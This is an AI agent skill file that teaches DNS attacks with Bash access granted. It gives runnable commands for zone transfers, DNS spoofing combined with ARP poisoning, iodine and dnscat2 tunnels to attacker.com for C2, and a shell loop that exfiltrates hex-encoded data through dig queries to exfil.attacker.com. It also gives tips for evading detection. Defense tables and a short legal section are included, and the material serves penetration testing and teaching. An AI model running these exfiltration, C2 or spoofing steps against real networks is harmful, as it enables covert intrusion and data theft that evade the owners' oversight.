---
name: dns-attacks
description: "DNS Attacks exploit the Domain Name System protocol for reconnaissance, spoofing, tunneling, and data exfiltration. DNS is a foundational infrastructure service that is frequently misconfigured, poorly monitored, and trusted by default -- making it an ideal attack vector."
origin: openclaw
version: "0.1.18"
compatibility:
  - openclaw
  - claude-code
  - cursor
  - windsurf
allowed-tools:
  - Bash
  - Read
  - Write
  - Edit
  - WebSearch
  - WebFetch
metadata:
  domain: network-attack
  tool_count: 8
  guide_count: 5
  mitre: "TA0011-Command and Control"
---




# Skill: DNS Attacks

> **Supplementary Files**:
> - `payloads.md` — DNS attack payload collection: zone transfer attempts, record enumeration, subdomain brute force, DNS spoofing, tunneling, exfiltration commands
> - `test-cases.md` — Structured test cases: complete test checklist covering DNS enumeration, spoofing, tunneling, C2 communication, and data exfiltration

## Summary

DNS is a foundational infrastructure service that is frequently misconfigured, poorly monitored, and trusted by default -- making it an ideal attack vector.

**Tools**: dnsrecon, dnsenum, fierce, dnschef, dns2tcp, dnscat2, dnswalk, iodine

**Domain**: network-attack

**MITRE ATT&CK**: TA0011-Command and Control

## Description

DNS Attacks exploit the Domain Name System protocol for reconnaissance, spoofing, tunneling, and data exfiltration. DNS is a foundational infrastructure service that is frequently misconfigured, poorly monitored, and trusted by default -- making it an ideal attack vector. Attackers leverage DNS to map target infrastructure through zone transfers and enumeration, redirect traffic through spoofing and cache poisoning, bypass network restrictions through DNS tunneling, and exfiltrate data through covert DNS channels.

**Core Insight**: DNS operates on UDP port 53, is rarely filtered by firewalls, and is almost never subjected to deep packet inspection. This makes DNS an ideal covert channel for command-and-control communication and data exfiltration in restricted networks where HTTP/HTTPS traffic is monitored or blocked.

**Key Attack Surfaces**:

- **DNS Misconfiguration**: AXFR zone transfers enabled, verbose error messages, predictable query IDs
- **Spoofing and Cache Poisoning**: Forged DNS responses, transaction ID prediction, Kaminsky-style attacks
- **DNS Tunneling**: Encoding data within DNS queries and responses using iodine, dns2tcp, dnscat2
- **Data Exfiltration**: Encoding sensitive data as subdomain labels in DNS queries to attacker-controlled nameservers
- **DNS Rebinding**: Manipulating DNS responses to bypass same-origin policy and access internal services

---

## Use Cases

1. **Infrastructure Reconnaissance** - Enumerate DNS records, zone transfers, subdomains, and server configurations to map target attack surface before engagement
2. **DNS Spoofing in MITM Attacks** - Redirect victims to malicious servers by spoofing DNS responses in combination with ARP spoofing for man-in-the-middle positioning
3. **Bypassing Network Restrictions** - Establish DNS tunnels to bypass captive portals, restrictive firewalls, and network segmentation that blocks HTTP/HTTPS but allows DNS
4. **Covert C2 Communication** - Use dnscat2 for encrypted command-and-control channels that evade typical network monitoring and egress filtering
5. **Data Exfiltration** - Encode stolen data into DNS queries to exfiltrate through DNS channels that are rarely inspected or logged
6. **Security Assessment and Hardening** - Audit DNS configurations for common misconfigurations (open zone transfers, recursion enabled, DNSSEC not deployed)

---

## Core Tools

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **dnsrecon** | Comprehensive DNS enumeration: zone transfers, record enumeration, brute force, SRV discovery | `dnsrecon -d target.com -t axfr` |
| **dnsenum** | DNS enumeration with zone transfer, brute force, and Google enumeration | `dnsenum target.com` |
| **fierce** | Lightweight DNS reconnaissance and subdomain brute force | `fierce --domain target.com` |
| **dnschef** | DNS proxy for spoofing DNS responses in MITM attacks | `dnschef --fakeip 192.168.1.100 --interface 0.0.0.0` |
| **dns2tcp** | DNS tunnel for forwarding TCP connections over DNS queries | `dns2tcpd -f dns2tcp.conf` |
| **dnscat2** | Encrypted DNS tunnel for C2 communication and data transfer | `ruby dnscat2.rb domain.com` |
| **dnswalk** | DNS zone debugger that checks for misconfigurations and reports inconsistencies | `dnswalk target.com.` |
| **iodine** | IP-over-DNS tunnel for establishing IPv4 connections through DNS | `iodined -f -P pass 10.0.0.1 tunnel.domain.com` |

Auxiliary tools: **dig** (manual DNS queries), **nslookup** (basic DNS lookup), **host** (DNS lookup utility), **dnstracer** (trace DNS resolution path), **dnsperf** (DNS performance testing).

---

## Methodology

### Attack Chain

```
[1] Enumerate              [2] Fingerprint          [3] Exploit
  - Zone transfer (AXFR)     - Server version          - DNS spoofing (dnschef)
  - Record enumeration       - Recursion test          - Cache poisoning
  - Subdomain brute force    - DNSSEC validation       - DNS rebinding
  - Reverse lookups          - Configuration audit     - Response manipulation
       |                          |                          |
       v                          v                          v
[4] Tunnel                 [5] Exfiltrate
  - iodine (IP-over-DNS)     - dnscat2 (encrypted C2)
  - dns2tcp (TCP forwarding)  - Custom DNS exfiltration
  - dnscat2 (C2 channel)     - Data encoding in queries
```

### Step-by-Step Approach

**1. Enumerate**
- Attempt zone transfers against all discovered nameservers using `dnsrecon -d target.com -t axfr`
- Enumerate standard record types: A, AAAA, MX, NS, TXT, SOA, SRV, CNAME, PTR
- Brute force subdomains with dnsenum and fierce using custom wordlists
- Perform reverse DNS lookups on target IP ranges to discover hostname mappings
- Use Bing/Google enumeration via dnsenum for additional subdomain discovery

**2. Fingerprint**
- Identify DNS server software and version using `dig @ns.target.com version.bind chaos txt`
- Test for open recursion: `dig @ns.target.com google.com` from an external IP
- Verify DNSSEC deployment and validate signed zones
- Check for predictable transaction IDs that enable spoofing attacks
- Assess whether DNS over TLS (DoT) or DNS over HTTPS (DoH) is configured

**3. Exploit**
- Deploy dnschef as a DNS proxy to spoof responses for targeted domains
- Integrate DNS spoofing with ARP poisoning using arpspoof for MITM positioning
- Test for DNS cache poisoning vulnerabilities using transaction ID prediction
- Attempt DNS rebinding attacks by configuring short TTL domains that resolve to internal IPs

**4. Tunnel**
- Establish IP-over-DNS tunnels using iodine for full network connectivity
- Set up dns2tcp for forwarding specific TCP services (SSH, HTTP) over DNS
- Deploy dnscat2 for encrypted, persistent C2 communication channels

**5. Exfiltrate**
- Encode data as subdomain labels in DNS queries to attacker-controlled nameservers
- Use dnscat2's built-in file transfer for encrypted exfiltration
- Implement custom DNS exfiltration scripts for targeted data extraction

### Defense Perspective

| Defense Measure | Description | Attack Types Countered |
|-----------------|-------------|----------------------|
| Disable Zone Transfers | Restrict AXFR to authorized secondary nameservers only | Reconnaissance, enumeration |
| Disable Open Recursion | Configure DNS servers to recurse only for trusted clients | DNS amplification, reconnaissance |
| Deploy DNSSEC | Sign zones and validate responses to prevent spoofing | Cache poisoning, spoofing |
| DNS Traffic Monitoring | Monitor for unusual query volume, long subdomain labels, specific tunnel patterns | Tunneling, exfiltration |
| Egress DNS Filtering | Restrict outbound DNS to authorized internal resolvers only | Tunneling, exfiltration, C2 |
| DNS-over-TLS/HTTPS | Encrypt DNS queries to prevent MITM spoofing | Spoofing, eavesdropping |

---

## Practical Steps

### 1. DNS Enumeration Phase

```bash
# Zone transfer attempt against all nameservers
dnsrecon -d target.com -t axfr

# Comprehensive enumeration with dnsenum
dnsenum --enum target.com

# Subdomain brute force with fierce
fierce --domain target.com --subbrute

# Manual record enumeration with dig
dig target.com ANY +noall +answer
dig target.com MX +noall +answer
dig target.com TXT +noall +answer
```

### 2. DNS Fingerprinting

```bash
# Query DNS server version
dig @ns1.target.com version.bind chaos txt

# Test for open recursion
dig @ns1.target.com google.com

# Check DNSSEC
dig target.com DNSKEY +short
dig target.com A +dnssec
```

### 3. DNS Spoofing

```bash
# Start dnschef to spoof specific domains
dnschef --fakeip 192.168.1.100 --interface 0.0.0.0 --file spoof_hosts.ini

# Combined with ARP spoofing for MITM
arpspoof -i eth0 -t 192.168.1.50 192.168.1.1
```

### 4. DNS Tunneling

```bash
# Server side - iodine
iodined -f -P secretpass 10.0.0.1 tunnel.attacker.com

# Client side - iodine
iodine -f -P secretpass dns.attacker.com tunnel.attacker.com

# dnscat2 server
ruby dnscat2.rb --secret=secretkey tunnel.attacker.com
```

### 5. DNS Exfiltration

```bash
# Simple data exfiltration via DNS queries
# Encode data as hex subdomain labels
echo -n "sensitive_data" | xxd -p | fold -w 30 | while read line; do
  dig $line.exfil.attacker.com @attacker_dns_ip
done
```

> **For detailed payloads see `payloads.md`, and for the complete test checklist see `test-cases.md`.**

---

## Common Pitfalls

- **Assuming zone transfers are disabled**: Many organizations still have at least one nameserver that allows AXFR from any source. Always test all discovered nameservers individually rather than assuming uniform configuration.
- **Ignoring reverse DNS lookups**: Forward enumeration finds subdomains, but reverse lookups on IP ranges often reveal hostnames, internal naming conventions, and services not discoverable through forward queries alone.
- **Neglecting DNS traffic monitoring**: DNS tunneling generates significantly more queries than normal traffic, with consistently long subdomain labels. Failing to monitor for these patterns allows tunnels to persist indefinitely.
- **Using default tunnel configurations**: Tools like iodine and dnscat2 have well-known default settings and query patterns that are easily flagged by DNS monitoring solutions. Always customize query types, intervals, and domain structures.

## Automation and Scripting

Automate DNS reconnaissance by chaining dnsrecon's enumeration modes with custom scripts that parse results and feed discovered subdomains into further testing. Use dnsenum's built-in Google dorking for passive subdomain discovery before active brute force. For tunneling, script iodine's connection establishment with automatic interface configuration and route addition. Build custom DNS exfiltration tools using Python's `dnslib` library that encode data into query labels, chunk appropriately for DNS size limits, and handle retransmission for lost responses. Monitor tunnel health with periodic ping probes through the DNS channel.

## Reporting and Documentation

DNS findings should document the specific misconfigurations discovered with evidence (zone transfer output showing all records, recursion test results, DNSSEC validation failures). For tunneling demonstrations, record the bandwidth achieved, the data transferred, and the DNS query patterns generated. Map spoofing attacks to MITM attack chains showing the full path from ARP poisoning through DNS spoofing to traffic interception. Include specific remediation: AXFR restriction configuration snippets for BIND and PowerDNS, DNSSEC deployment steps, and DNS monitoring rule recommendations (Suricata/Snort signatures for tunnel detection).

## Legal and Ethical Considerations

DNS enumeration (zone transfers, record queries) against publicly accessible nameservers is generally permissible as these are public-facing services. However, aggressive brute-force enumeration that generates thousands of queries may trigger rate limiting or abuse alerts. DNS spoofing requires network-level access (same broadcast domain for ARP spoofing) and explicit authorization. DNS tunneling against production networks without authorization may violate acceptable use policies and could disrupt legitimate DNS resolution. Never exfiltrate actual sensitive data during testing; use test data that demonstrates the capability without exposing real information.

## Integration with Other Tools

DNS attack findings chain directly into multiple attack paths. DNS enumeration results (subdomains, IP ranges) feed into network-pentest for service scanning and vulnerability-assessment for broader assessment. DNS spoofing integrates with network-level MITM attacks using arpspoof and Bettercap, connecting to web-application testing for credential interception. DNS tunneling and exfiltration complement post-exploitation techniques for maintaining persistence and moving data out of restricted networks. DNS rebinding attacks connect to web-ssrf for exploiting server-side request forgery through DNS manipulation.

## Case Studies and Examples

- **Open zone transfer reveals entire infrastructure**: During an engagement, a zone transfer attempt against a secondary nameserver returned over 2,000 DNS records including internal subdomains (gitlab.internal.corp.com, jenkins.build.corp.com), staging environments, and development servers. This single misconfiguration provided a complete map of the organization's infrastructure, reducing reconnaissance from days to minutes.
- **DNS tunnel bypasses captive portal**: In a network assessment where all HTTP/HTTPS traffic was intercepted by a captive portal requiring authentication, iodine was used to establish an IP-over-DNS tunnel. The tunnel provided full TCP connectivity, allowing the assessor to SSH into an external server and bypass the network restriction entirely, as DNS queries to the internet were allowed without authentication.
- **dnscat2 maintains C2 after firewall hardening**: After a red team gained initial access to a target network, the blue team hardened egress filtering to block all outbound HTTP/HTTPS connections. The red team switched to dnscat2 for command and control, using DNS queries to an attacker-controlled domain. The encrypted DNS channel maintained persistence for the remaining engagement period undetected.

## Detection and Evasion

Defenders detect DNS attacks through: high-volume AXFR attempts from unrecognized IPs, unusual query patterns (excessively long subdomain labels consistent with tunneling), DNS response anomalies (mismatched transaction IDs, unexpected response sources), and statistical deviations in query volume or timing. DNS monitoring tools like PassiveDNS, dnscat2's detection signatures, and Suricata rules for known tunnel patterns can identify malicious DNS activity. To evade detection during testing: randomize query intervals to avoid statistical detection, limit tunnel bandwidth to blend with normal traffic, use TXT or NULL record types instead of the more commonly monitored CNAME, and rotate through multiple attacker-controlled domains to distribute query patterns.

## Advanced Techniques

Advanced DNS attack techniques include: Kaminsky-style cache poisoning using predictable transaction IDs and source ports, DNS rebinding with precise timing to bypass same-origin policy in web browsers, DNS-based reflection and amplification attacks leveraging open resolvers (achieving 28-54x amplification factors), blind DNS enumeration via zone walking with NSEC records, and DNS-over-HTTPS tunneling that encapsulates DNS within encrypted HTTPS traffic to evade traditional DNS monitoring. For red team operations, DNS beaconing through Cobalt Strike's DNS communication channel provides low-and-slow C2 that generates minimal per-query traffic while maintaining persistent connectivity.

## Tool Comparison Matrix

| Tool | Best For | Speed | Stealth | Skill Level |
|------|----------|-------|---------|-------------|
| **dnsrecon** | Comprehensive DNS enumeration | Fast | Low (active) | Beginner |
| **dnsenum** | All-in-one enumeration | Moderate | Low (active) | Beginner |
| **fierce** | Lightweight subdomain brute force | Fast | Moderate | Beginner |
| **dnschef** | DNS spoofing and redirection | Fast | High (local) | Intermediate |
| **iodine** | IP-over-DNS tunneling | Moderate (bandwidth-limited) | Low (noisy) | Intermediate |
| **dns2tcp** | TCP forwarding over DNS | Moderate | Moderate | Intermediate |
| **dnscat2** | Encrypted DNS C2 channel | Slow (intentional) | High (encrypted) | Advanced |
| **dnswalk** | DNS misconfiguration auditing | Fast | High (passive) | Beginner |

## Hacker Laws

1. **Trust is a Vulnerability** -- DNS relies on a chain of trust from root servers through TLD servers to authoritative servers, with no built-in confidentiality. Every query is sent in plaintext by default. The protocol was designed for a cooperative, trusted network -- not the adversarial internet it operates on today. Exploiting DNS means exploiting misplaced trust in infrastructure.

2. **Protocol Abuse is Invisible** -- DNS tunneling and exfiltration work because DNS is considered "normal" traffic. Firewalls allow it, monitors rarely inspect it, and administrators trust it. The most effective attack channels are those that hide in plain sight using protocols that security infrastructure ignores by default.

3. **Defense in Depth** -- No single DNS security measure is sufficient. DNSSEC prevents spoofing but does not stop tunneling. Egress filtering stops tunneling but does not prevent enumeration. Zone transfer restriction prevents enumeration but does not stop brute force. Layer DNSSEC, monitoring, filtering, and access controls for comprehensive protection.

4. **Assume Misconfiguration** -- DNS infrastructure is frequently managed by administrators who are not security specialists. Misconfigurations (open recursion, unrestricted zone transfers, missing DNSSEC) are the norm rather than the exception. Always test for the simplest misconfiguration before attempting sophisticated attacks.

---

## Learning Resources

**Skill supplementary files**: payloads.md, test-cases.md

**Related skills**:
- `skills/network-pentest/SKILL.md` — Network penetration testing: DNS spoofing integrates with MITM attack chains
- `skills/recon-osint/SKILL.md` — OSINT reconnaissance: DNS enumeration as a passive intelligence source
- `skills/post-exploitation/SKILL.md` — Post-exploitation: DNS tunneling and exfiltration for maintaining access

**External resources**:
- **Workspace internal materials**: `guides/dns-enumeration-reconnaissance-guide.md`, `guides/dns-tunneling-exfiltration-guide.md`, `guides/dns-spoofing-cache-poisoning-guide.md`
- **DNS Reconnaissance Guide**: https://blog.g0tmi1k.com/2011/02/dns-enumeration/
- **iodine Documentation**: https://code.kryo.se/iodine/ — IP-over-DNS tunneling tool
- **dnscat2 GitHub**: https://github.com/iagox86/dnscat2 — Encrypted DNS C2 tool
- **HackTricks - DNS**: https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns
- **DNSSEC Deployment Guide**: https://www.icann.org/resources/pages/dnssec-2012-02-25-en
